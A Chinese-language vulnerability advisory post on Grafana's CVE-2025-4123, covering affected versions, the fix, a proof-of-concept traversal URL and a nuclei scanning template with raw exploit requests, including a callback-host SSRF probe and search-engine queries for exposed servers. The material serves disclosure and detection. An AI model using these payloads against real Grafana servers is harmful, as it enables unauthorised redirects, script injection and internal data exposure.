#  【漏洞预警】Grafana未授权跨站点脚本攻击xss和SSRF漏洞（CVE-2025-4123）   
PokerSec  PokerSec   2025-05-26 11:11  
  
**先关注，不迷路.**  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 漏洞介绍  
  
Grafana 是一款开源的跨平台数据可视化与监控分析工具，广泛应用于实时指标展示、日志分析和运维监控领域。  
Grafana 中存在一个跨站脚本 （XSS） 漏洞，该漏洞是由客户端路径遍历和开放重定向相结合引起的。这允许攻击者将用户重定向到托管将执行任意 JavaScript 的前端插件的网站。此漏洞不需要编辑者权限，如果启用了匿名访问，XSS 将正常工作。如果安装了 Grafana Image Renderer 插件，则可以利用 open 重定向来实现完全读取 SSRF。Grafana 中的默认 Content-Security-Policy （CSP） 将通过 'connect-src' 指令阻止 XSS。  
## 漏洞编号  
  
CVE-2025-4123  
## 影响范围  
  
该漏洞影响所有受支持的 Grafana 版本，包括：Grafana 11.2至12.0版本，以及追溯至Grafana 8的所有不受支持汉本。Grafana Cloud 用户不受影响。  
## 漏洞复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJJ1d4p6e8nOG3y1FX55e3cnjUqKGibYNFEJFboia4u2myPJtAw7twt0mZo6vPdiaKaPcas1EFnMf7FLA/640?wx_fmt=png&from=appmsg "")  
  
POC:  
  
(这微信页面直接复制代码格式会乱，可以浏览器打开复制)  
```
/public/..%2F%5cbaidu.com%2F%3f%2F..%2F..
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJJ1d4p6e8nOG3y1FX55e3cngVXjT1wqnAlZ1icne9d7PzFAPIvCv2DNop1jichh0JrXObN3xPGYKHuw/640?wx_fmt=png&from=appmsg "")  
  
## 漏洞分析  
  
Grafana CVE-2025-4123：SSRF 和账户接管漏洞完整解读  
```
https://nightbloodz.github.io/grafana-CVE-2025-4123/
```  
  
  
## nuclei脚本  
```
id: CVE-2025-4123

info:
  name: Grafana-Xss-SSrf-CVE-2025-4123
  author: PokerSec
  severity: high
  description: |
    An open redirect vulnerability in Grafana can be chained with other issues, such as XSS or SSRF, to increase impact. An attacker may exploit the redirect to target internal services or deliver malicious JavaScript, potentially leading to internal data exposure or account takeover.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N
    cvss-score: 7.6
  reference:
    - https://medium.com/@Nightbloodz/grafana-cve-2025-4123-full-read-ssrf-account-takeover-d12abd13cd53
    - https://grafana.com/blog/2025/05/21/grafana-security-release-high-severity-security-fix-for-cve-2025-4123/
  metadata:
    verified: true
    max-request: 1
    shodan-query: product:"Grafana"
    fofa-query: app="Grafana"
  tags: cve,cve2025,grafana,redirect,unauth,oss

http:
  - raw:
      - |
        GET /render/public/..%252f%255C{{interactsh-url}}%252f%253F%252f..%252f.. HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /public/..%2F%5coast.pro%2F%3f%2F..%2F.. HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        name: open-redirect
        dsl:
          - status_code == 302 && contains(location, '/\\oast.pro/?/../../')

      - type: dsl
        name: ssrf
        dsl:
          - contains(interactsh_protocol, 'dns') && contains(content_type, 'image/png')
```  
##   
## 修复意见  
  
更新  
grafana  
到最新版本：  
https://github.com/grafana/grafana  
  
修复的版本通过对redirectPath进行Clean操作，预先处理了URL重定向路径中的非法操作，避免了由于重定向导致XSS漏洞的触发。  
  
  
如有侵权，请及时联系删除。  
  
  
